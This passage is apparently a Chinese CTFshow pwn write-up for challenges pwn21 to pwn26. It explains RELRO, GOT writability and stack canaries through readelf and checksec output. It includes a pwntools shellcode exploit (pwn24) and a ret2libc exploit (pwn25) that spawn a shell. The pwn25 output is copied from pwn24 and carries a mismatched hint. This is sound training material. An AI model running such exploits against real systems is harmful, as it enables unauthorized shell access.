 0     8</span><br><span class="line">  [23] .data             PROGBITS         0000000000600f58  00000f58</span><br><span class="line">       0000000000000010  0000000000000000  WA       0     0     8</span><br><span class="line">  [24] .bss              NOBITS           0000000000600f68  00000f68</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">  [25] .comment          PROGBITS         0000000000000000  00000f68</span><br><span class="line">       0000000000000029  0000000000000001  MS       0     0     1</span><br><span class="line">  [26] .symtab           SYMTAB           0000000000000000  00000f98</span><br><span class="line">       00000000000005e8  0000000000000018          27    43     8</span><br><span class="line">  [27] .strtab           STRTAB           0000000000000000  00001580</span><br><span class="line">       00000000000001f1  0000000000000000           0     0     1</span><br><span class="line">  [28] .shstrtab         STRTAB           0000000000000000  00001771</span><br><span class="line">       0000000000000103  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

<h2 id="pwn21"><a href="#pwn21" class="headerlink" title="pwn21"></a>pwn21</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint：提交ctfshow&#123;【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】&#125;</span><br><span class="line">例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</span><br><span class="line">最终flag为ctfshow&#123;1_1_0x400820_0x8208820&#125;</span><br><span class="line">若某个表不存在，则无需写其对应地址</span><br><span class="line">如不存在.got.plt表，则最终flag值为ctfshow&#123;1_0_0x400820&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn 0x600ff0</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : What is RELRO protection ?</span><br><span class="line">    * *************************************</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">$ ./pwn 0x601000</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : What is RELRO protection ?</span><br><span class="line">    * *************************************</span><br><span class="line">RELRO: 52454c52</span><br></pre></td></tr></table></figure>

<p>在写.got表的时候就会抛出异常，而写.got.plt依旧正常</p>
<p>故flag:ctfshow{0_1_0x600ff0_0x601000}</p>
<h6 id="分析过程：-4"><a href="#分析过程：-4" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>可以看到RELRO保护部分开启了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ objdump -R pwn</span><br><span class="line"></span><br><span class="line">pwn:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  <span class="built_in">printf</span>@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  strtol@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>

<p>可以看到两种符号的OFFSET不在一页（大小为0x1000字节）上，权限就有可能不同</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -S pwn</span><br><span class="line">There are 29 section headers, starting at offset 0x1950:</span><br><span class="line"></span><br><span class="line">  [21] .got              PROGBITS         0000000000600ff0  00000ff0</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br></pre></td></tr></table></figure>

<p>这样看是不是它两还是都可写呢？但是仔细去看程序头就会发现不同：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -L pwn</span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040</span><br><span class="line">                 0x00000000000001f8 0x00000000000001f8  R      0x8</span><br><span class="line">  INTERP         0x0000000000000238 0x0000000000400238 0x0000000000400238</span><br><span class="line">                 0x000000000000001c 0x000000000000001c  R      0x1</span><br><span class="line">      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]</span><br><span class="line">  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000</span><br><span class="line">                 0x0000000000000d68 0x0000000000000d68  R E    0x200000</span><br><span class="line">  LOAD           0x0000000000000e10 0x0000000000600e10 0x0000000000600e10</span><br><span class="line">                 0x0000000000000230 0x0000000000000238  RW     0x200000</span><br><span class="line">  DYNAMIC        0x0000000000000e20 0x0000000000600e20 0x0000000000600e20</span><br><span class="line">                 0x00000000000001d0 0x00000000000001d0  RW     0x8</span><br><span class="line">  NOTE           0x0000000000000254 0x0000000000400254 0x0000000000400254</span><br><span class="line">                 0x0000000000000044 0x0000000000000044  R      0x4</span><br><span class="line">  GNU_EH_FRAME   0x0000000000000c2c 0x0000000000400c2c 0x0000000000400c2c</span><br><span class="line">                 0x000000000000003c 0x000000000000003c  R      0x4</span><br><span class="line">  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000000 0x0000000000000000  RW     0x10</span><br><span class="line">  GNU_RELRO      0x0000000000000e10 0x0000000000600e10 0x0000000000600e10</span><br><span class="line">                 0x00000000000001f0 0x00000000000001f0  R      0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment mapping:</span><br><span class="line">  Segment Sections...</span><br><span class="line">   00</span><br><span class="line">   01     .interp</span><br><span class="line">   02     .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn.rela.plt .init .plt .text .fini .rodata .eh_frame_hdr .eh_frame</span><br><span class="line">   03     .init_array .fini_array .dynamic .got .got.plt .data .bss  <span class="comment">#该段具有 RW（可读可写）权限</span></span><br><span class="line">   04     .dynamic</span><br><span class="line">   05     .note.ABI-tag .note.gnu.build-id</span><br><span class="line">   06     .eh_frame_hdr</span><br><span class="line">   07</span><br><span class="line">   08     .init_array .fini_array .dynamic .got  <span class="comment">#包含 .got，但不包含 .got.plt   这表明：GOT 的前半部分（.got） 在程序加载后可能被标记为只读（由 GNU_RELRO 控制），防止被篡改。GOT.PLT（.got.plt） 通常仍保持可写，用于动态解析函数地址。</span></span><br></pre></td></tr></table></figure>

<p>可以看到程序头多了GNU_RELRO，将.dynamic 、.got标记为只读权限（R），那么在重定向完成后，动态链接器就会将这个区域保护起来。</p>
<p>在写.got表的时候就会抛出异常，而写.got.plt依旧正常</p>
<h2 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint：提交ctfshow&#123;【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】&#125;</span><br><span class="line">例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</span><br><span class="line">最终flag为ctfshow&#123;1_1_0x400820_0x8208820&#125;</span><br><span class="line">若某个表不存在，则无需写其对应地址</span><br><span class="line">如不存在.got.plt表，则最终flag值为ctfshow&#123;1_0_0x400820&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn 0x600fc0</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : What is RELRO protection ?</span><br><span class="line">    * *************************************</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>

<p>在写.got表的时候就会抛出异常，而.got.plt不存在</p>
<p>故flag:ctfshow{0_0_0x600fc0}</p>
<h6 id="分析过程：-5"><a href="#分析过程：-5" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x400000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>64位现在完全开启了RELRO保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -S pwn</span><br><span class="line">There are 28 section headers, starting at offset 0x1900:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000400238  00000238</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 3] .note.gnu.bu[...] NOTE             0000000000400274  00000274</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298</span><br><span class="line">       000000000000001c  0000000000000000   A       5     0     8</span><br><span class="line">  [ 5] .dynsym           DYNSYM           00000000004002b8  000002b8</span><br><span class="line">       0000000000000090  0000000000000018   A       6     1     8</span><br><span class="line">  [ 6] .dynstr           STRTAB           0000000000400348  00000348</span><br><span class="line">       000000000000004b  0000000000000000   A       0     0     1</span><br><span class="line">  [ 7] .gnu.version      VERSYM           0000000000400394  00000394</span><br><span class="line">       000000000000000c  0000000000000002   A       5     0     2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED          00000000004003a0  000003a0</span><br><span class="line">       0000000000000020  0000000000000000   A       6     1     8</span><br><span class="line">  [ 9] .rela.dyn         RELA             00000000004003c0  000003c0</span><br><span class="line">       0000000000000030  0000000000000018   A       5     0     8</span><br><span class="line">  [10] .rela.plt         RELA             00000000004003f0  000003f0</span><br><span class="line">       0000000000000048  0000000000000018  AI       5    21     8</span><br><span class="line">  [11] .init             PROGBITS         0000000000400438  00000438</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [12] .plt              PROGBITS         0000000000400450  00000450</span><br><span class="line">       0000000000000040  0000000000000010  AX       0     0     16</span><br><span class="line">  [13] .text             PROGBITS         0000000000400490  00000490</span><br><span class="line">       0000000000000252  0000000000000000  AX       0     0     16</span><br><span class="line">  [14] .fini             PROGBITS         00000000004006e4  000006e4</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [15] .rodata           PROGBITS         00000000004006f0  000006f0</span><br><span class="line">       000000000000053a  0000000000000000   A       0     0     8</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS         0000000000400c2c  00000c2c</span><br><span class="line">       000000000000003c  0000000000000000   A       0     0     4</span><br><span class="line">  [17] .eh_frame         PROGBITS         0000000000400c68  00000c68</span><br><span class="line">       0000000000000100  0000000000000000   A       0     0     8</span><br><span class="line">  [18] .init_array       INIT_ARRAY       0000000000600dc0  00000dc0</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .fini_array       FINI_ARRAY       0000000000600dc8  00000dc8</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [20] .dynamic          DYNAMIC          0000000000600dd0  00000dd0</span><br><span class="line">       00000000000001f0  0000000000000010  WA       6     0     8</span><br><span class="line">  [21] .got              PROGBITS         0000000000600fc0  00000fc0</span><br><span class="line">       0000000000000040  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .data             PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000010  0000000000000000  WA       0     0     8</span><br><span class="line">  [23] .bss              NOBITS           0000000000601010  00001010</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">  [24] .comment          PROGBITS         0000000000000000  00001010</span><br><span class="line">       0000000000000029  0000000000000001  MS       0     0     1</span><br><span class="line">  [25] .symtab           SYMTAB           0000000000000000  00001040</span><br><span class="line">       00000000000005d0  0000000000000018          26    42     8</span><br><span class="line">  [26] .strtab           STRTAB           0000000000000000  00001610</span><br><span class="line">       00000000000001f1  0000000000000000           0     0     1</span><br><span class="line">  [27] .shstrtab         STRTAB           0000000000000000  00001801</span><br><span class="line">       00000000000000fa  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

<p>可以看到已经没有了.got.plt,而且.got也是不可写的</p>
<h2 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</span><br><span class="line">     ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">     不是nc连接</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">The authenticity of host <span class="string">&#x27;lpwn,challenge.ctf,show]:28198 ([124.223.158.81]:28198)&#x27;</span>can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:PC6yCxGdKk51w8EXuEj0+Id4t/qL5AN1o0bgwj20yw.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[pwn,challenge,ctf.show]:28198,[124.223,158.81]:28198’(EcDsA) to the list of known hosts.</span><br><span class="line">ctfshow@pwn.challenge.ctf.show<span class="string">&#x27;s password: #输入密码 123456 进行连接</span></span><br><span class="line"><span class="string">$ ./pwnme aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">* Classify: CTFshow --- PWN --- 入门</span></span><br><span class="line"><span class="string">* Type  : Linux_Security_Mechanisms     </span></span><br><span class="line"><span class="string">* Site  : https://ctf.show/    </span></span><br><span class="line"><span class="string">* Hint  : No canary found     </span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">How to input ?</span></span><br><span class="line"><span class="string">ctfshow&#123;...&#125;</span></span><br></pre></td></tr></table></figure>

<h6 id="分析过程：-6"><a href="#分析过程：-6" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位开启NX保护，部分开启RELRO保护</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">64</span>, stream);</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How to input ?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">1</span> )</span><br><span class="line">    ctfshow((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">58</span>]; <span class="comment">// [esp+Ah] [ebp-3Eh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>首先，程序尝试打开名为”&#x2F;ctfshow_flag”的文件，并将文件指针赋值给 stream 变量。如果打开文件失败（文件不存在或无法访问），程序输出错误消息并终止。</p>
</li>
<li><p>如果成功打开文件，程序使用 fgets 函数从文件中读取最多64个字符到名为 flag 的缓冲区。</p>
</li>
<li><p>程序输出提示消息：”How to input ?”。</p>
</li>
<li><p>如果程序运行时传入了命令行参数（ argc 大于1），则调用 ctfshow 函数，并将第一个命令行参数作为参数传递给该函数。</p>
</li>
<li><p>ctfshow 函数很简单，它接受一个字符串参数 src ，并使用 strcpy 函数将该字符串复制到名为 dest 的缓冲区中。然后，它返回指向 dest 缓冲区的指针。</p>
</li>
</ol>
<p>这里仅仅是为了演示当未开启Canary保护时，输入字符串长度超过了 dest 缓冲区的大小，这可能导致缓冲区溢出漏洞。</p>
<p>详细原理在后续会再进行详细讲解。</p>
<h2 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h2><p>Hint：你可以使用pwntools的shellcraft模块来进行攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : NX disabled &amp; Has RWX segments</span><br><span class="line">    * *************************************</span><br><span class="line">jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814<span class="variable">$ri</span>\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX̀</span><br><span class="line">\xe7k\xe8F</span><br><span class="line">$ <span class="built_in">cat</span> /ctfshow_flag</span><br><span class="line">[DEBUG] Sent 0x12 bytes:</span><br><span class="line">    <span class="string">&#x27;cat ctfshow_flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    <span class="string">&#x27;ctfshow&#123;...&#125;\n&#x27;</span></span><br><span class="line">ctfshow&#123;...&#125;</span><br></pre></td></tr></table></figure>

<h6 id="分析过程：-7"><a href="#分析过程：-7" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX disabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br></pre></td></tr></table></figure>

<p>32位仅部分开启RELRO保护</p>
<p>可以看到存在一个RWX权限的段，即可读可写可执行的段</p>
<p>直接IDA查看main函数发现有一个ctfshow函数，但是无法跟进</p>
<p>那么就直接看汇编了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080484C6                 public ctfshow</span><br><span class="line">.text:080484C6 ctfshow         proc near               ; CODE XREF: main+132↓p</span><br><span class="line">.text:080484C6</span><br><span class="line">.text:080484C6 buf             = byte ptr -88h</span><br><span class="line">.text:080484C6 var_4           = dword ptr -4</span><br><span class="line">.text:080484C6 p_argc          = dword ptr  8</span><br><span class="line">.text:080484C6</span><br><span class="line">.text:080484C6 ; __unwind &#123;</span><br><span class="line">.text:080484C6                 push    ebp</span><br><span class="line">.text:080484C7                 mov     ebp, esp</span><br><span class="line">.text:080484C9                 push    ebx</span><br><span class="line">.text:080484CA                 sub     esp, 84h</span><br><span class="line">.text:080484D0                 call    __x86_get_pc_thunk_bx</span><br><span class="line">.text:080484D5                 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:080484DB                 sub     esp, 4</span><br><span class="line">.text:080484DE                 push    100h            ; nbytes</span><br><span class="line">.text:080484E3                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484E9                 push    eax             ; buf</span><br><span class="line">.text:080484EA                 push    0               ; fd</span><br><span class="line">.text:080484EC                 call    _read</span><br><span class="line">.text:080484F1                 add     esp, 10h</span><br><span class="line">.text:080484F4                 sub     esp, 0Ch</span><br><span class="line">.text:080484F7                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484FD                 push    eax             ; s</span><br><span class="line">.text:080484FE                 call    _puts</span><br><span class="line">.text:08048503                 add     esp, 10h</span><br><span class="line">.text:08048506                 lea     eax, [ebp+buf]</span><br><span class="line">.text:0804850C                 call    eax</span><br><span class="line">.text:0804850E                 nop</span><br><span class="line">.text:0804850F                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:08048512                 leave</span><br><span class="line">.text:08048513                 retn</span><br><span class="line">.text:08048513 ; &#125; // starts at 80484C6</span><br><span class="line">.text:08048513 ctfshow         endp</span><br></pre></td></tr></table></figure>

<ol>
<li>函数开始时进行一些栈操作，保存寄存器的值。</li>
<li>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</li>
<li>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</li>
<li>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</li>
<li>调用 puts 函数，将缓冲区的内容打印到标准输出。</li>
<li>通过调用 call eax 指令，以 eax 寄存器的值作为函数指针，跳转到缓冲区中存储的地址执</li>
</ol>
<p>行。</p>
<ol start="7">
<li>之后是一些清理工作和函数返回的准备操作。</li>
</ol>
<p>可能这里看得还是云里雾里，后面慢慢会逐步清晰起来。但实际上这题题目提示了可以使用</p>
<p>pwntools的shellcraft模块进行攻击</p>
<p>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。</p>
<p>Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</p>
<p>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode。</p>
<p>那么我们可以直接尝试编写exp进行攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment"># 导入 pwntools 库</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> <span class="comment"># 设置日志级别为调试模式</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;) # 本地连接</span></span><br><span class="line">io = remote(<span class="string">&quot;ip&quot;</span>, 端口) <span class="comment"># 远程连接</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment"># 生成一个 Shellcode</span></span><br><span class="line">io.sendline(shellcode) <span class="comment"># 将生成的 Shellcode 发送到目标主机</span></span><br><span class="line">io.interactive() <span class="comment"># 与目标主机进行交互</span></span><br></pre></td></tr></table></figure>

<h2 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h2><p>Hint：开启NX保护，或许可以试试ret2libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,10000)</span></span><br><span class="line"><span class="comment">#io = remote(&quot;pwn.challenge.ctf.show&quot;, 28177)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">0</span>) +p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print hex(write)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line">libc_base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system) + p32(main) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : NX disabled &amp; Has RWX segments</span><br><span class="line">    * *************************************</span><br><span class="line">jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814<span class="variable">$ri</span>\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX̀</span><br><span class="line">\xe7k\xe8F</span><br><span class="line">$ <span class="built_in">cat</span> /ctfshow_flag</span><br><span class="line">[DEBUG] Sent 0x12 bytes:</span><br><span class="line">    <span class="string">&#x27;cat ctfshow_flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    <span class="string">&#x27;ctfshow&#123;...&#125;\n&#x27;</span></span><br><span class="line">ctfshow&#123;...&#125;</span><br></pre></td></tr></table></figure>

<h6 id="分析过程：-8"><a href="#分析过程：-8" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位开启NX保护，部分开启RELRO保护</p>
<p>具体攻击手法为：ret2libc</p>
<p>（即先找到栈溢出漏洞，通过write函数泄露 write 函数的真实地址，根据泄露的 write 函数地</p>
<p>址，使用 LibcSearcher 来搜索 libc 库中相应的函数地址和字符串地址，获取 system 函数和</p>
<p>“&#x2F;bin&#x2F;sh” 字符串的地址。构造新的 payload，使用泄露的 system 函数和 “&#x2F;bin&#x2F;sh” 字符串的地</p>
<p>址来进行get shell）</p>
<p>这里的内容为后续栈部分讲解内容，目前WP在前面不做详细讲解，目的仅为了演示在开启某些保护</p>
<p>可以使用哪些攻击手法</p>
<h2 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h2><p>Hint：设置好 ALSR 保护参数值即可获得flag<br>	为确保flag正确，本题建议用提供虚拟机运行</p>
